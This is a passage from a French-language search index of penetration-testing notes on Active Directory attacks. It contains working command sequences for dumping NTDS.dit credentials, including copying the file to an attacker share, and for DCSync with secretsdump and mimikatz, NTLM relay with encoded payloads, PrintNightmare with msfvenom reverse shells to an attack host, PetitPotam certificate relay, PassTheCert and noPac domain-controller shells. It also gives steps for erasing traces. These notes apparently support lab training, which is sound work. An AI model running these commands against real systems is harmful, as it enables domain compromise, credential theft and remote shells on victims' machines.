Corp.\n\nSuccessfully created shadow copy for 'C:\\'\n    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}\n    Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#copier-a-partir-du-cliche-instantanne","title":"Copier \u00e0 partir du clich\u00e9 instantann\u00e9","text":"<pre><code>copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit \\\\&lt;Attacker_IP&gt;\\share\\\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#cliche-instantanne-diskshadowexe","title":"Clich\u00e9 instantann\u00e9 (diskshadow.exe)","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#creer-une-shadow-copy-cliche-instantanne-du-disque-c_1","title":"Cr\u00e9er une Shadow Copy (clich\u00e9 instantann\u00e9) du disque C","text":"<pre><code>diskshadow.exe\n set verbose on\n set metadata C:\\Windows\\Temp\\meta.cab\n set context clientaccessible\n set context persistent\n begin backup\n add volume C: alias cdrive\n create\n expose %cdrive% E:\n end backup\n exit\n</code></pre> <p>Effacer ses traces : apr\u00e8s avoir copi\u00e9 ntds.dit (ou autre) on pourra supprimer le clich\u00e9 instantan\u00e9 ainsi que son exposition via le lecteur E:</p> <pre><code>diskshadow.exe\n unexpose e: \n list shadows all# affiche la liste des snapshots si on n'a pas not\u00e9 l'ID lors de sa cr\u00e9ation\n\n DELETE SHADOWS Exposed E: \n # ou \n DELETE SHADOWS SET {446f7942-bd76-41a9-aff7-d7c854abe93f}\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#copier-a-partir-du-cliche-instantanne_1","title":"Copier \u00e0 partir du clich\u00e9 instantann\u00e9","text":"<p>Remarque :  Si le fichier n'est pas accessible et que l'on est membre du groupe Backup Operator, on pourra y acc\u00e9der via le privil\u00e8ge SeBackupPrivilege (voir [[Exploitation des privil\u00e8ges Windows]])</p> <pre><code># cas 1 : Robocopy \"sait\" utiliser le privil\u00e8ge SeBackupPrivilege\nrobocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit\n\n# cas 2 : sans robocopy, ce cmdlet est li\u00e9 \u00e0 un outil r\u00e9f\u00e9renc\u00e9 dans le lien ci-dessus\nCopy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#creation-dune-sauvegarde-via-ntdsutil-non-teste","title":"Cr\u00e9ation d'une sauvegarde via ntdsutil (non test\u00e9)","text":"<p>Le fichier cr\u00e9\u00e9 dans ce format pourra par la suite \u00eatre exploit\u00e9 pour fournir des m\u00e9triques sur diff\u00e9rents \u00e9l\u00e9ments li\u00e9s aux mots de passe et leur robuster via l'outil Domain Password Audit Tool (DPAT) https://github.com/clr2of8/DPAT</p> <pre><code>ntdsutil \"ac in ntds\" \"ifm\" \"cr fu c:\\temp\" q q\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#a-distance","title":"A distance","text":"<pre><code>## utilise \u00e0 distance ntdsutil\nnxc smb ip -u user -p pass -M ntdsutil\n\ncrackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds\n\nsecretsdump.py -just-dc-user $AD_DOMAIN/krbtgt  $AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#extraction-des-informations-didentification-credentials","title":"Extraction des informations d'identification (credentials)","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#localement_1","title":"Localement","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#extraction-des-informations-presentes-dans-ntdsdit-via-dsinternals","title":"Extraction des informations pr\u00e9sentes dans NTDS.dit via DSInternals","text":"<pre><code># https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.12/DSInternals_v4.12.zip\nPS C:\\htb&gt; Import-Module .\\DSInternals.psd1\nPS C:\\htb&gt; $key = Get-BootKey -SystemHivePath .\\SYSTEM\nPS C:\\htb&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#a-distance_1","title":"A distance","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/NTDS.dit/#extraction-des-hash-dun-dump-ntdsdit-via-secretsdumppy","title":"Extraction des hash d'un dump NTDS.dit via secretsdump.py","text":"<p>Pr\u00e9requis : disposer d'NTDS.dit et du dump SYSTEM via <code>reg save HKLM\\SYSTEM SYSTEM.SAV</code></p> <pre><code>secretsdump.py -ntds ntds.dit -system SYSTEM.sav -hashes lmhash:nthash LOCAL\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/DCSync/","title":"DCSync","text":"<p>Cette attaque permet de r\u00e9cup\u00e9rer les hash des comptes krbtgt et autres utilisateurs du domaine entra\u00eenant une compromission totale du domaine ainsi qu'une persistance importante.</p>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Distante/Attaque%20DCSync%20depuis%20Linux/","title":"Attaque DCSync depuis Linux","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Distante/Attaque%20DCSync%20depuis%20Linux/#secretsdump","title":"secretsdump","text":"<pre><code># g\u00e9n\u00e8re 3 fichiers commencant par 'hashes' contenant :\n# - les hasn LM:NT\n# - les mots de passe stock\u00e9s en clair (chifrrement r\u00e9versible)\n# - les cl\u00e9s kerberos\nsecretsdump.py -outputfile \"hashes\" -just-dc $AD_DOMAIN/$AD_USER:\"$AD_PASSWORD\"@$TARGET_IP\n</code></pre> <p>On pourra utiliser en compl\u00e9ment les param\u00e8tres suivants, principalement pour fournir des statistiques \u00e0 un commanditaire :</p> <ul> <li><code>-pwd-last-set</code> : stock \u00e9galement la date du dernier changement de mot de passe</li> <li><code>-history</code> : collecte \u00e9galement les mots de passe pr\u00e9c\u00e9dents pour de potentielles comparaisons</li> <li><code>-user-status</code> : stock \u00e9galement l'\u00e9tat du compte (d\u00e9sactiv\u00e9 ou non)</li> </ul>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Locale/Attaque%20DCSync%20depuis%20Windows/","title":"Attaque DCSync depuis Windows","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Locale/Attaque%20DCSync%20depuis%20Windows/#mimikatz","title":"Mimikatz","text":"<pre><code># collecte du Hash de Krbtgt (pour golden ticket)\nmimikatz &gt; lsadump::dcsync /domain:DOMAIN /user:DOMAIN\\krbtgt\n# collecte du hash du compte Administrateur\nmimikatz &gt; lsadump::dcsync /domain:DOMAIN /user:DOMAIN\\Administrateur\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Locale/Attaque%20DCSync%20depuis%20Windows/#identification-de-comptes-ayant-leur-mot-de-passe-stocke-en-clair","title":"Identification de comptes ayant leur mot de passe stock\u00e9 en clair","text":""},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Locale/Attaque%20DCSync%20depuis%20Windows/#module-active-directory","title":"Module Active Directory","text":"<pre><code># ENCRYPTED_TEXT_PWD_ALLOWED = 128 (https://learn.microsoft.com/th-TH/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)\nGet-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre>"},{"location":"_Techniques/Windows/Dump%20de%20credentials/DCSync/Locale/Attaque%20DCSync%20depuis%20Windows/#powerview","title":"Powerview","text":"<pre><code>. .\\Powerview.ps1\n Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Relais%20NTLM%20%28Forced%20Authentication%20Attack%29/","title":"Relais NTLM (Forced Authentication Attack)","text":"<p>Il est parfois possible de relayer une demande d'authentification lorsqu'on arrive pas \u00e0 casser un mot de passe.</p> <pre><code># On d\u00e9sactive d'abord SMB dans la configuration du responder \n\ncat /etc/responder/Responder.conf | grep 'SMB ='\n\nSMB = Off\n</code></pre> <pre><code># On lance ensuite impacket :\nimpacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP\n\n## Lorsqu'on recoit une connexion SMB, elle est relay\u00e9e vers $TARGET_IP\n## Par d\u00e9faut un dump de la SAM est r\u00e9alis\u00e9\n\n## On peut \u00e9galement ex\u00e9cuter une commande :\nimpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;B64_PAYLOAD&gt;'\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/Quick%20Wins/","title":"Quick Wins","text":"<p>Liste de vuln\u00e9rabilit\u00e9s communes dont il est recommand\u00e9 de v\u00e9rifier la pr\u00e9sense.</p> <p>[[Common Windows Exploits]]</p> <p>[[NoPac (Sam AccountName Spoofing)]]</p> <p>[[PrintNightmare (CVE-2021-1675)]]</p> <p>Voir \u00e9galement le dossier contenant ces liens pour une liste \u00e0 jour</p>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/","title":"PrintNightmare (CVE 2021 1675)","text":"CVE CVE-2021-34527\u00a0et\u00a0CVE-2021-1675 Correctif fixant la vuln\u00e9rabilit\u00e9 CU 2021-06 et 2021-07"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#elements-necessaires-a-lexploitation","title":"El\u00e9ments n\u00e9cessaires \u00e0 l'exploitation","text":"<ul> <li>Machine non patch\u00e9e</li> <li>Spooler d'impression d\u00e9marr\u00e9 (par d\u00e9faut toutes les machines)</li> </ul>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#verification","title":"V\u00e9rification","text":"<pre><code>cme smb targets.txt -d INLANEFREIGHT.LOCAL -u 'ssmalls' -p 'Password123!'  -M printnightmare\n[*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)\n[+] INLANEFREIGHT.LOCAL\\ssmalls:Password123! \nVulnerable, next step https://github.com/ly4k/PrintNightmare\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#exploitation","title":"Exploitation","text":""},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#a-distance","title":"A distance","text":""},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#installation-de-loutil","title":"Installation de l'outil","text":"<pre><code>git clone https://github.com/cube0x0/CVE-2021-1675.git\n\n## N\u00e9cessite une version modifi\u00e9e d'impacket\npip3 uninstall impacket # d\u00e9sinstallation d'impacket\ngit clone https://github.com/cube0x0/impacket # installation de la version modifi\u00e9e\ncd impacket\npython3 ./setup.py install\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#verification-de-la-disponibilite-du-spooler","title":"V\u00e9rification de la disponibilit\u00e9 du spooler","text":"<pre><code>rpcdump.py @$TARGET_IP | egrep 'MS-RPRN|MS-PAR'\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#execution-de-lattaque","title":"Ex\u00e9cution de l'attaque","text":"<pre><code># Creation d'un reverse shell au format DLL\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.172.16.5.225 LPORT=443 -f dll &gt; shell.dll\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=1234 -f dll &gt; bad.dll\n# Partage de la dll\nsudo \nsmbserver.py -smb2support CompData  . &amp;\n\n# Ex\u00e9cution du multi handler depuis msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST ATTACK_IP\nset LPORT 1234\nrun\n\n# D\u00e9clenchement de l'exploit\nsudo python3 CVE-2021-1675.py domain.local/$AD_USER:$AD_PASSWORD@$TARGET_IP '\\\\ATTACK_IP\\ShareName\\bad.dll'\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#localement","title":"Localement","text":"<p>On pourra utiliser ce POC qui s'appuie sur powershell : https://github.com/calebstewart/CVE-2021-1675</p>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#verification-de-la-disponibilite-du-spooler_1","title":"V\u00e9rification de la disponibilit\u00e9 du spooler","text":"<pre><code>ls \\\\localhost\\pipe\\spoolss\n\n\n    Directory: \\\\localhost\\pipe\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n                                                  spoolss\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#execution-de-lattaque_1","title":"Ex\u00e9cution de l'attaque","text":"<p>https://github.com/cube0x0/CVE-2021-1675</p>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#chargement-du-module","title":"Chargement du module","text":"<pre><code>Set-ExecutionPolicy Bypass -Scope Process\n\nImport-Module .\\cve-2021-1675.ps1\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#creation-dun-compte-administrateur-local","title":"Cr\u00e9ation d'un compte administrateur local","text":"<pre><code># Add a new user to the local administrators group by default:\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default\nInvoke-Nightmare -DriverName \"Xerox\" -NewUser \"john\" -NewPassword \"SuperSecure\" \n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#chargement-dune-dll-de-notre-choix-reverse-shell-par-exemple","title":"Chargement d'une DLL de notre choix (reverse shell par exemple)","text":"<pre><code>Import-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/06/PrintNightmare%20%28CVE-2021-1675%29/#verification_1","title":"V\u00e9rification","text":"<pre><code>net user hacker\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/","title":"Petit Potam (MS EFSRPC)","text":"CVE CVE-2021-36942 Correctif fixant la vuln\u00e9rabilit\u00e9 CU-2021-08"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#elements-necessaires-a-lexploitation","title":"El\u00e9ments n\u00e9cessaires \u00e0 l'exploitation","text":"<ul> <li>Un ADCS doit \u00eatre pr\u00e9sent dans le r\u00e9seau</li> </ul>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#exploitation","title":"Exploitation","text":""},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#installation-de-loutil","title":"Installation de l'outil","text":"<pre><code>git clone git@github.com:topotam/PetitPotam.git\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#utilisation","title":"Utilisation","text":"<p>Il faut conna\u00eetre le nom du serveur ADCS. On peut le trouver par diverses m\u00e9thodes :</p> <ul> <li>Sous Windows : <code>certutil \u2013config \u2013 -ping</code></li> <li>https://www.thehacker.recipes/ad/movement/ad-cs</li> </ul> <pre><code># Activation du relais NTLM\nsudo ntlmrelayx.py -debug -smb2support --target http://&lt;ADCS-SERVER-FQDN&gt;/certsrv/certfnsh.asp --adcs --template DomainController\n\n# Exploitation\npython3 PetitPotam.py &lt;attack host IP&gt; &lt;Domain Controller IP&gt;\n</code></pre> <p>On capture ensuite le certificat encod\u00e9 en base 64 dans les logs de ntlmrelayx pour l'utiliser ensuite pour demander un TGT</p> <pre><code>python3 gettgtpkinit.py DOMAIN.LOCAL/DomainController$ -pfx-base64 &lt;B64 Cert&gt; tgt.ccache\n\n.\\Rubeus.exe asktgt /user:DomainController$ /certificate:&lt;B64 Payload&gt; /ptt\n</code></pre> <p>On peut ensuite finir par une attaque DCSync :</p> <ul> <li>[[Attaque DCSync depuis Linux]]</li> <li>[[Attaque DCSync depuis Windows]]</li> </ul>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#infos-utiles","title":"Infos utiles","text":"<p>Le certificat une fois collect\u00e9 en base 64 depuis ntlmrelayx peut \u00eatre lu de la fa\u00e7on suivante :</p> <pre><code>cat cert.b64 | base64 -d &gt; cert.pfx\nsha256sum cert.pfx \n(htb) &gt; 8806736f71db33587e684a69ccc7b683df38d31bb7d335689771ff71a34bff9f  cert.pfx\n(kali)&gt; 8806736f71db33587e684a69ccc7b683df38d31bb7d335689771ff71a34bff9f  cert.pfx\nopenssl x509 -in cert.pfx -text -noout\n\n# export du certificat\nopenssl pkcs12 -in cert.pfx -clcerts -nokeys -out domaincontroller.crt \n# export de la cl\u00e9 priv\u00e9e (pas trouv\u00e9 comment supprimer la passphrase directement)\nopenssl pkcs12 -in cert.pfx -nocerts -out domaincontroller.key\n# suppression de la passphrase\nopenssl rsa -in domaincontroller.key -out domaincontroller.key # saisie de la passphrase\n\n# informations sur le certificat\nopenssl x509 -in domaincontroller.crt -text\n# informations sur la cl\u00e9 priv\u00e9e\nopenssl rsa -in domaincontroller.key -text\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/08/Petit%20Potam%20%28MS-EFSRPC%29/#utilisation-de-passthecert","title":"Utilisation de PassTheCert","text":"<pre><code># Test de connection \npython passthecert.py -domain $AD_DOMAIN -dc-host $TARGET_IP -crt DC.crt -key DC.key\n[*] You are logged in as: DOMAIN\\DC01$\n\n# Exploitation 1 : reset du mot de passe d'un administrateur\n-target administrator -new-pass 'P@ssw0rd!'\n\n\n-------------\nproxychains python passthecert.py -domain 'inlanefreight.local' -dc-host 172.16.5.5 -crt /home/kali/projets/challenges/htb-academy/cpts/pivotting/active-directory/initial-enumeration/adcert/domaincontroller.crt -key /home/kali/projets/challenges/htb-academy/cpts/pivotting/active-directory/initial-enumeration/adcert/domaincontroller.key -elevate -target forend -debug -action ldap-shell\n\nadd_computer rebrec$ rebrec nospns\nchange_password rebrec$ rebrec\n\n\n\nset_rbcd ACADEMY-EA-DC01$ rebrec$  # le bon je pense\n&gt; rebrec$ can now impersonate users on ACADEMY-EA-DC01$ via S4U2Proxy\n\n# CHECK \nproxychains rbcd.py -delegate-to 'ACADEMY-EA-DC01$' -dc-ip 172.16.5.5 -action 'read' 'INLANEFREIGHT/forend:Klmcargo2'\n\n\n# recherche du SPN du DC\nproxychains ldapsearch -LLL -x -H ldap://172.16.5.5  -D \"forend@inlanefreight.local\" -W -b \"dc=inlanefreight,dc=local\" \"servicePrincipalName=*\" sAMAccountName servicePrincipalName &gt; spns\n\n# r\u00e9cup\u00e9ration du ST \nproxychains getST.py -spn 'cifs/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT' -impersonate 'forend' -dc-ip 172.16.5.5 'INLANEFREIGHT/rebrec$:rebrec' \n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/","title":"NoPac (Sam AccountName Spoofing)","text":"CVE 2021-42287 et \u00a02021-42278 Correctif fixant la vuln\u00e9rabilit\u00e9 CU 2021-11"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#elements-necessaires-a-lexploitation","title":"El\u00e9ments n\u00e9cessaires \u00e0 l'exploitation","text":"<ul> <li>MAJ Windows appliqu\u00e9es inf\u00e9rieures \u00e0 2021-11</li> <li><code>ms-DS-MachineAccountQuota</code> doit \u00eatre sup\u00e9rieur \u00e0 0 pour nous permettre de cr\u00e9er un compte d'ordinateur</li> </ul>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#exploitation","title":"Exploitation","text":""},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#installation-de-loutil","title":"Installation de l'outil","text":"<pre><code># installer impacket\ngit clone https://github.com/SecureAuthCorp/impacket.git\npython setup.py install \n# cloner le d\u00e9pot de l'exploit\ngit clone https://github.com/Ridter/noPac.git\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#lancement-du-scanner-pour-verifier-si-la-cible-est-vulnerable","title":"Lancement du scanner pour v\u00e9rifier si la cible est vuln\u00e9rable","text":"<pre><code>sudo python3 scanner.py $AD_DOMAIN/$AD_USER:$AD_PASSWORD -dc-ip $TARGET_IP -use-ldap\n</code></pre>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#obtention-dun-shell-sur-le-controlleur-de-domaine","title":"Obtention d'un shell sur le controlleur de domaine","text":"<pre><code>sudo python3 noPac.py $AD_DOMAIN/$AD_USER:$AD_PASSWORD -dc-ip $TARGET_IP   -dc-host $DC_HOSTNAME -shell --impersonate administrator -use-ldap\n</code></pre> <p>On pourra utiliser diff\u00e9rents shells \u00e0 l'aide des param\u00e8tres suivants :</p> <pre><code>-exec-method smbexec\n-exec-method wmiexec\n-exec-method mmcexec\n</code></pre> <p>Message d'erreur possible :</p> <pre><code>[-] Pls use full domain name, such as: domain.com/username\n</code></pre> <p>Ce message appara\u00eet si le nom du domaine saisit n'est pas \u00e9crit en majuscule apparemment (pas eu le temps de chercher la cause de ce probl\u00e8me)</p>"},{"location":"_Techniques/Windows/Privesc/Exploitation%20de%20vuln%C3%A9rabilit%C3%A9s%20%28Quick%20Wins%29/2021/11/NoPac%20%28Sam%20AccountName%20Spoofing%29/#dump-de-hash","title":"Dump de Hash","text":"<p>Attention aux subtilit\u00e9s</p> <ul> <li>noPac.py prend en premier param\u00e8tre les identifiants d'un utilisateurs du domaine pr\u00e9fix\u00e9s par le nom de domaine DNS</li> <li>a l'inverse, le param\u00e8tre -just-dc-user ne retourne un r\u00e9sultat que si on pr\u00e9fixe l'utilisateur par le nom de domaine NETBIOS</li> </ul> <pre><code>sudo python noPac.py DOMAIN.DNS.LOCAL/$AD_USER:$AD_PASSWORD -dc-ip $TARGET_IP  -dc-host domainControllerHostname  --impersonate administrator  -dump -just-dc-user NETBIOS_DOMAIN/administrator -just-dc\n</code></pre>"}]}